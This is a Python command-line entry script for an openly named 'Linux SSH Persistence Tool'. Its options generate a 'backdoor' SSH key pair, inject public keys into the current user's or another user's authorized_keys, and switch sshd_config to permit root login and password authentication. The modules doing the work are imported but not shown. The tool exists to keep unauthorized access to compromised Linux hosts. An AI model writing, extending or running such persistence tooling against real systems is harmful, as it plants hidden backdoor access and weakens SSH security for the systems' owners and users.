#!/usr/bin/env python3
import argparse
from .persistence.authorized_keys import AuthorizedKeysInjector
from .persistence.root_user_inject import RootUserInjector
from .persistence.sshd_config import SSHDConfigModifier
from .keygen.generator import BackdoorKeyGenerator
from .detection.scanner import SSHKeyScanner

def main():
    parser = argparse.ArgumentParser(description="Linux SSH Persistence Tool")
    parser.add_argument('--list', action='store_true', help="List all authorized keys")
    parser.add_argument('--generate-key', action='store_true', help="Generate backdoor SSH key pair")
    parser.add_argument('--inject-key', type=str, help="Inject public key (string)")
    parser.add_argument('--inject-key-file', type=str, help="Inject public key from file")
    parser.add_argument('--target-user', type=str, help="Inject key for another user (requires root)")
    parser.add_argument('--enable-root-login', action='store_true', help="Enable PermitRootLogin yes")
    parser.add_argument('--enable-password-auth', action='store_true', help="Enable PasswordAuthentication yes")

    args = parser.parse_args()

    if args.list:
        SSHKeyScanner().list_all()

    elif args.generate_key:
        BackdoorKeyGenerator.generate()

    elif args.inject_key or args.inject_key_file:
        key = args.inject_key
        if args.inject_key_file:
            with open(args.inject_key_file) as f:
                key = f.read().strip()

        if args.target_user:
            RootUserInjector().inject_for_user(args.target_user, key)
        else:
            AuthorizedKeysInjector().inject(key)

    elif args.enable_root_login:
        SSHDConfigModifier().modify("PermitRootLogin", "yes")

    elif args.enable_password_auth:
        SSHDConfigModifier().modify("PasswordAuthentication", "yes")

    else:
        parser.print_help()

if __name__ == "__main__":
    main()